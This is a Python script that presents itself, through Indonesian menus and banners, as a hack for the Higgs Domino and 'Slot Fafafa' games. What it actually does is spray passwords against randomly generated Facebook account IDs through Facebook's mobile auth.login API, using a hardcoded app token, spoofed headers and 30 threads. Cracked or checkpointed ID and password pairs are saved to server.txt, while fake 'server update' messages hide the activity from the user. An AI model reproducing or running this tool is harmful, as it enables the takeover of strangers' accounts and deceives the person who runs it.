#Yg Rekod Anak Babi
#Jangan Rekod Kontol
#my_github_https://github.com/wayle77/slot-fafafa
#wa:PRIVAT


W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
logo = """
\033[1;92m  
 ==========================================
   ~  HACK GAME HIGGS DOMINO ISLAND ~
 ==========================================
"""

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print('\033[93;1m[+] UPDATE SCRIPT SLOT FAFAFA [Versi terbaru]\033[0m')
		print('\033[1;92m[+]HACK SLOT FAFAFA\033[0m')
		print("")
		print("%s[%s1%s]%s KHUSUS NOMOR ID %s[Pengunjung]"%(G,G,R,Y,B))
		print("\033[1;31m[2] EXIT")
		__SHO = input("\n\033[0;91m➤ \033[0;92m Pilih \033[0m: ")
		if __SHO in ["", " "]:
			Main()
		elif __SHO in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input("\033[97;1m[+] SCATTER PRIZES [MAX 300] ENTER : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m[+] SCATTER PRIZES -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s[+] SCATTER PRIZES RATE [➤] %s00000,00000,000000"%(G,Y))
				listpass = input("%s[+] MASUKAN NOMER ID AKUN :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s[+] SANDI MAX [6] Digit "%(B))
				print("%s[+] HACK MENGGUNAKAN NOMOR ID -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s[➤] server update.neptunegame.com -> server.txt"%(G))
				print("%s[➤] server update.neptunegame.com -> server.txt"%(C))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n[➤] BUKA APLIKASI HIGGS DOMINO...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]"
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]"
			"Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36]"
			"NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+]"
		])
		sys.stdout.write(
			"\r\r%sserver ➤ %s/%s -> \033[0;97m Toptobos.com:%s \033[0;97m connetion:%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;93mserver ➤ update.neptunegame.com|%s | %s\033[0;93m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("server.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[92;1mserver ➤ connetion|%s | %s\033[92;1m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("server.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

try:Main()
except Exception as e:exit(str(e))
os.system('xdg-open https://update.neptunegame.com/home/loginid2')
